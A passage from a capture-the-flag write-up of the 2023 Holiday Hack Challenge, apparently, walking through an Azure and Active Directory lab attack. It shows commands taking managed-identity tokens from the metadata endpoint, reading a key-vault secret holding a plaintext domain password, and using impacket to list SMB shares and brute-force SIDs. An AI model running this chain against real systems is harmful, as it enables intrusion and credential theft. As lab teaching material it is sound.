+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;resourceGroupName&#34;</span>: <span style=color:#2aa198>&#34;northpole-rg1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;resourceId&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;securityProfile&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;secureBootEnabled&#34;</span>: <span style=color:#2aa198>&#34;false&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;virtualTpmEnabled&#34;</span>: <span style=color:#2aa198>&#34;false&#34;</span>
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;sku&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;storageProfile&#34;</span>: {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;dataDisks&#34;</span>: [],
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;imageReference&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;offer&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;publisher&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;sku&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;version&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;osDisk&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;caching&#34;</span>: <span style=color:#2aa198>&#34;ReadWrite&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createOption&#34;</span>: <span style=color:#2aa198>&#34;Attach&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;diffDiskSettings&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;option&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;diskSizeGB&#34;</span>: <span style=color:#2aa198>&#34;30&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;encryptionSettings&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;enabled&#34;</span>: <span style=color:#2aa198>&#34;false&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;image&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;uri&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;managedDisk&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/disks/ssh-server-vm_os_disk&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;storageAccountType&#34;</span>: <span style=color:#2aa198>&#34;Standard_LRS&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;ssh-server-vm_os_disk&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;osType&#34;</span>: <span style=color:#2aa198>&#34;Linux&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;vhd&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;uri&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;writeAcceleratorEnabled&#34;</span>: <span style=color:#2aa198>&#34;false&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;resourceDisk&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;size&#34;</span>: <span style=color:#2aa198>&#34;63488&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;subscriptionId&#34;</span>: <span style=color:#2aa198>&#34;2b0942f3-9bca-484b-a508-abdae2db5e64&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;tags&#34;</span>: <span style=color:#2aa198>&#34;Project:HHC23&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;tagsList&#34;</span>: [
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;Project&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;value&#34;</span>: <span style=color:#2aa198>&#34;HHC23&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    ],
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;userData&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;version&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;vmId&#34;</span>: <span style=color:#2aa198>&#34;1f943876-80c5-4fc2-9a77-9011b0096c78&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;vmScaleSetName&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;vmSize&#34;</span>: <span style=color:#2aa198>&#34;Standard_B4ms&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;zone&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;network&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;interface&#34;</span>: [
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;ipv4&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;ipAddress&#34;</span>: [
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;privateIpAddress&#34;</span>: <span style=color:#2aa198>&#34;10.0.0.50&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;publicIpAddress&#34;</span>: <span style=color:#2aa198>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>          ],
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;subnet&#34;</span>: [
+</span></span><span style=display:flex><span>            {
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;address&#34;</span>: <span style=color:#2aa198>&#34;10.0.0.0&#34;</span>,
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;prefix&#34;</span>: <span style=color:#2aa198>&#34;24&#34;</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>          ]
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;ipv6&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;ipAddress&#34;</span>: []
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;macAddress&#34;</span>: <span style=color:#2aa198>&#34;6045BDFE2D67&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    ]
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We have to get a different token to talk to AD.</p><pre tabindex=0><code>// Get the token:
+curl &#39;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.net&#39; \
+    -H Metadata:true &gt; nem.txt
+
+// Put it in the cURL config file like we saw before.
+curl &#34;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&#34; \
+    -K cfg2 
+</code></pre><p>To get the result:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-it-kv&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;type&#34;</span>: <span style=color:#2aa198>&#34;Microsoft.KeyVault/vaults&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tags&#34;</span>: {},
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;systemData&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdBy&#34;</span>: <span style=color:#2aa198>&#34;thomas@sanshhc.onmicrosoft.com&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdByType&#34;</span>: <span style=color:#2aa198>&#34;User&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdAt&#34;</span>: <span style=color:#2aa198>&#34;2023-10-30T13:17:02.532Z&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedBy&#34;</span>: <span style=color:#2aa198>&#34;thomas@sanshhc.onmicrosoft.com&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedByType&#34;</span>: <span style=color:#2aa198>&#34;User&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedAt&#34;</span>: <span style=color:#2aa198>&#34;2023-10-30T13:17:02.532Z&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;sku&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;family&#34;</span>: <span style=color:#2aa198>&#34;A&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;Standard&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;accessPolicies&#34;</span>: [],
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enabledForDeployment&#34;</span>: <span style=color:#cb4b16>false</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enabledForDiskEncryption&#34;</span>: <span style=color:#cb4b16>false</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enabledForTemplateDeployment&#34;</span>: <span style=color:#cb4b16>false</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enableSoftDelete&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;softDeleteRetentionInDays&#34;</span>: <span style=color:#2aa198>90</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enableRbacAuthorization&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;vaultUri&#34;</span>: <span style=color:#2aa198>&#34;https://northpole-it-kv.vault.azure.net/&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;publicNetworkAccess&#34;</span>: <span style=color:#2aa198>&#34;Enabled&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    },
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;northpole-ssh-certs-kv&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;type&#34;</span>: <span style=color:#2aa198>&#34;Microsoft.KeyVault/vaults&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;location&#34;</span>: <span style=color:#2aa198>&#34;eastus&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tags&#34;</span>: {},
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;systemData&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdBy&#34;</span>: <span style=color:#2aa198>&#34;thomas@sanshhc.onmicrosoft.com&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdByType&#34;</span>: <span style=color:#2aa198>&#34;User&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;createdAt&#34;</span>: <span style=color:#2aa198>&#34;2023-11-12T01:47:13.059Z&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedBy&#34;</span>: <span style=color:#2aa198>&#34;thomas@sanshhc.onmicrosoft.com&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedByType&#34;</span>: <span style=color:#2aa198>&#34;User&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;lastModifiedAt&#34;</span>: <span style=color:#2aa198>&#34;2023-11-12T01:50:52.742Z&#34;</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;properties&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;sku&#34;</span>: {
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;family&#34;</span>: <span style=color:#2aa198>&#34;A&#34;</span>,
+</span></span><span style=display:flex><span>          <span style=color:#268bd2>&#34;name&#34;</span>: <span style=color:#2aa198>&#34;standard&#34;</span>
+</span></span><span style=display:flex><span>        },
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;accessPolicies&#34;</span>: [
+</span></span><span style=display:flex><span>          {
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;objectId&#34;</span>: <span style=color:#2aa198>&#34;0bc7ae9d-292d-4742-8830-68d12469d759&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;permissions&#34;</span>: {
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;keys&#34;</span>: [
+</span></span><span style=display:flex><span>                <span style=color:#2aa198>&#34;all&#34;</span>
+</span></span><span style=display:flex><span>              ],
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;secrets&#34;</span>: [
+</span></span><span style=display:flex><span>                <span style=color:#2aa198>&#34;all&#34;</span>
+</span></span><span style=display:flex><span>              ],
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;certificates&#34;</span>: [
+</span></span><span style=display:flex><span>                <span style=color:#2aa198>&#34;all&#34;</span>
+</span></span><span style=display:flex><span>              ],
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;storage&#34;</span>: [
+</span></span><span style=display:flex><span>                <span style=color:#2aa198>&#34;all&#34;</span>
+</span></span><span style=display:flex><span>              ]
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>          },
+</span></span><span style=display:flex><span>          {
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;tenantId&#34;</span>: <span style=color:#2aa198>&#34;90a38eda-4006-4dd5-924c-6ca55cacc14d&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;objectId&#34;</span>: <span style=color:#2aa198>&#34;1b202351-8c85-46f1-81f8-5528e92eb7ce&#34;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#268bd2>&#34;permissions&#34;</span>: {
+</span></span><span style=display:flex><span>              <span style=color:#268bd2>&#34;secrets&#34;</span>: [
+</span></span><span style=display:flex><span>                <span style=color:#2aa198>&#34;get&#34;</span>
+</span></span><span style=display:flex><span>              ]
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>        ],
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enabledForDeployment&#34;</span>: <span style=color:#cb4b16>false</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enableSoftDelete&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;softDeleteRetentionInDays&#34;</span>: <span style=color:#2aa198>90</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;vaultUri&#34;</span>: <span style=color:#2aa198>&#34;https://northpole-ssh-certs-kv.vault.azure.net/&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;provisioningState&#34;</span>: <span style=color:#2aa198>&#34;Succeeded&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;publicNetworkAccess&#34;</span>: <span style=color:#2aa198>&#34;Enabled&#34;</span>
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  ],
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;nextLink&#34;</span>: <span style=color:#2aa198>&#34;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&amp;$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg==&#34;</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Not useful. Let's get a token for <code>vault.azure.net</code>.</p><pre tabindex=0><code>curl &#39;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net&#39; \
+    -H Metadata:true &gt; cfg3
+
+curl -K cfg3 &#34;https://northpole-ssh-certs-kv.vault.azure.net/secrets?api-version=7.4&#34;
+
+// no access
+</code></pre><p>Let's try a different API call.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl -K cfg<span style=color:#2aa198>3</span> <span style=color:#2aa198>&#34;https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: [
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript&#34;</span>,
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;attributes&#34;</span>: {
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;enabled&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;created&#34;</span>: <span style=color:#2aa198>1699564823</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;updated&#34;</span>: <span style=color:#2aa198>1699564823</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;recoveryLevel&#34;</span>: <span style=color:#2aa198>&#34;Recoverable+Purgeable&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#268bd2>&#34;recoverableDays&#34;</span>: <span style=color:#2aa198>90</span>
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#268bd2>&#34;tags&#34;</span>: {}
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  ],
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;nextLink&#34;</span>: <span style=color:#cb4b16>null</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Cool, get the secret.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>curl -K cfg<span style=color:#2aa198>3</span> <span style=color:#2aa198>&#34;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/?api-version=7.4&#34;</span> | jq
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;value&#34;</span>: <span style=color:#2aa198>&#34;Import-Module ActiveDirectory; $UserName = \&#34;elfy\&#34;; $UserDomain = \&#34;northpole.local\&#34;; $UserUPN = \&#34;$UserName@$UserDomain\&#34;; $Password = ConvertTo-SecureString \&#34;J4`ufC49/J4766\&#34; -AsPlainText -Force; $DCIP = \&#34;10.0.0.53\&#34;; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \&#34;\&#34; -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;id&#34;</span>: <span style=color:#2aa198>&#34;https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d&#34;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;attributes&#34;</span>: {
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;enabled&#34;</span>: <span style=color:#cb4b16>true</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;created&#34;</span>: <span style=color:#2aa198>1699564823</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;updated&#34;</span>: <span style=color:#2aa198>1699564823</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;recoveryLevel&#34;</span>: <span style=color:#2aa198>&#34;Recoverable+Purgeable&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>&#34;recoverableDays&#34;</span>: <span style=color:#2aa198>90</span>
+</span></span><span style=display:flex><span>  },
+</span></span><span style=display:flex><span>  <span style=color:#268bd2>&#34;tags&#34;</span>: {}
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>After unescaping with Cyberchef:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#b58900>Import-Module</span> ActiveDirectory
+</span></span><span style=display:flex><span><span style=color:#268bd2>$UserName</span> = <span style=color:#2aa198>&#34;elfy&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>$UserDomain</span> = <span style=color:#2aa198>&#34;northpole.local&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>$UserUPN</span> = <span style=color:#2aa198>&#34;</span><span style=color:#268bd2>$UserName</span><span style=color:#2aa198>@</span><span style=color:#268bd2>$UserDomain</span><span style=color:#2aa198>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#268bd2>$Password</span> = <span style=color:#b58900>ConvertTo-SecureString</span> <span style=color:#2aa198>&#34;J4`ufC49/J4766&#34;</span> -AsPlainText -Force
+</span></span><span style=display:flex><span><span style=color:#268bd2>$DCIP</span> = <span style=color:#2aa198>&#34;10.0.0.53&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#b58900>New-ADUser</span> -UserPrincipalName <span style=color:#268bd2>$UserUPN</span> -Name <span style=color:#268bd2>$UserName</span> -GivenName <span style=color:#268bd2>$UserName</span>
+</span></span><span style=display:flex><span>    -Surname <span style=color:#2aa198>&#34;&#34;</span> -Enabled $true -AccountPassword <span style=color:#268bd2>$Password</span> -Server <span style=color:#268bd2>$DCIP</span> -PassThru
+</span></span></code></pre></div><p>Now we have the domain controller's IP, username and password.</p><p>How do we find file shares?</p><pre tabindex=0><code>// this should be run with a token for management
+
+curl &#34;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01&#34; \
+    -K cfg-management 
+
+{&#34;value&#34;:[]}
+</code></pre><p>Nothing, maybe we should try and see what's at <code>northpole.local</code>.</p><p>Now I remember that we have access to impacket so can use it to enumerate all
+accessible shares.</p><pre tabindex=0><code>smbclient.py &#39;DOMAIN&#39;/&#39;USER&#39;:&#39;PASSWORD&#39;@&#39;DOMAIN_CONTROLLER&#39;
+
+# password has a / so we need to wrap it in single quotes.
+
+$ smbclient.py northpole.local/elfy:&#39;J4`ufC49/J4766&#39;@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+
+# use FileShare
+# ls
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 .
+drw-rw-rw-          0  Wed Dec 13 01:20:30 2023 ..
+-rw-rw-rw-     701028  Wed Dec 13 01:20:33 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Wed Dec 13 01:20:33 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Wed Dec 13 01:20:33 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Wed Dec 13 01:20:33 2023 super_secret_research
+-rw-rw-rw-        165  Wed Dec 13 01:20:33 2023 todo.txt
+
+# cd super_secret_research
+[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+# ls super_secret_research
+[-] [Errno 2] No such file or directory: &#39;super_secret_research&#39;
+
+# cat todo.txt
+1. Bake some cookies.
+2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
+3. Profit
+</code></pre><p>Let's look at other shares. Most are inaccessible. NETLOGON is empty.</p><pre tabindex=0><code>use IPC$
+# ls
+-rw-rw-rw-          3  Mon Jan  1 00:00:00 1601 InitShutdown
+[removed]
+</code></pre><p>NTLM info:</p><pre tabindex=0><code>$ DumpNTLMInfo.py 10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[+] SMBv1 Enabled   : False
+[+] Prefered Dialect: SMB 3.0
+[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
+[+] Max Read Size   : 8.0 MB (8388608 bytes)
+[+] Max Write Size  : 8.0 MB (8388608 bytes)
+[+] Current Time    : 2023-12-13 07:33:32.812993+00:00
+[+] Name            : npdc01
+[+] Domain          : NORTHPOLE
+[+] DNS Tree Name   : northpole.local
+[+] DNS Domain Name : northpole.local
+[+] DNS Host Name   : npdc01.northpole.local
+[+] OS              : Windows NT 10.0 Build 20348
+[+] Null Session    : False
+</code></pre><p>Look at SIDs.</p><pre tabindex=0><code>$ lookupsid.py northpole.local/elfy:&#39;J4`ufC49/J4766&#39;@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Brute forcing SIDs at 10.0.0.53
+[*] StringBinding ncacn_np:10.0.0.53[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-797234457-4040996451-3763944187
+498: NORTHPOLE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: NORTHPOLE\alabaster (SidTypeUser)
+501: NORTHPOLE\Guest (SidTypeUser)
+502: NORTHPOLE\krbtgt (SidTypeUser)
